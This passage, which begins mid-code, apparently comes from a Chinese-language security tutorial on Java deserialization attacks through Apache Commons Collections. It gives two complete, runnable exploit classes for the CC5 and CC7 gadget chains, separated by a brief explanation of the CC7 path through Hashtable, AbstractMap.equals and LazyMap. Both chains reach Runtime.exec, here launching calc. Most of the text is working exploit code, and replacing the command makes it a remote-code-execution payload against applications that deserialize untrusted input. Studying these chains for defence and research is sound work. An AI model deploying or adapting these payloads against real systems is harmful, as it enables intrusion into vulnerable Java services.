import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc5 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> a = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(a, new ConstantTransformer(1));

        TiedMapEntry commit = new TiedMapEntry(lazyMap, "commit");

        BadAttributeValueExpException in = new BadAttributeValueExpException(null);

        Class d = LazyMap.class;
        Field factoryField = d.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);

        Class c = BadAttributeValueExpException.class;
        Field val = c.getDeclaredField("val");
        val.setAccessible(true);
        val.set(in,commit);

        serialize(in);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}

```



# cc7

tips:因为也是改变入口所以cc7使用的依旧是cc3的依赖，师傅们别搞错了

## 思路分析

ysoserial中的思路：

![image-20230430203434542](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430203434542.png)

 我们跟着上面的思路查看一下

![image-20230430205045176](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430205045176.png)

key是我们所传的键值对（即我们可控）

![image-20230430205111829](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430205111829.png)

这里的map我们也是课控的

![image-20230430210153599](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430210153599.png)

最后就进入到了`AbstractMap`的equals方法

![image-20230430210225213](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430210225213.png)

这里解释一下是为什么会找到`AbstractMap`的equals：

如下图所示：

![image-20230430210448214](https://commit-1311320644.cos.ap-shanghai.myqcloud.com/image-20230430210448214.png)

lazymap是没有equals方法的所以如果调用则会去父类查找，恰好我们的`AbstractMap`有equals方法且调用了get这样我们就能让整条链子实现；

## 最终exp

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class cc7_test {
    public static void main(String[] args) throws Exception{

        final Transformer transformerChain = new ChainedTransformer(new Transformer[0]);

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc"}),
                new ConstantTransformer(1)
        };

        //使用Hashtable来构造利用链调用LazyMap
        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);
        lazyMap2.remove("yy");
        //输出两个元素的hash值
        System.out.println("lazyMap1 hashcode:" + lazyMap1.hashCode());
        System.out.println("lazyMap2 hashcode:" + lazyMap2.hashCode());


        //iTransformers = transformers（反射）
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain, transformers);

        serialize(hashtable);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}
```







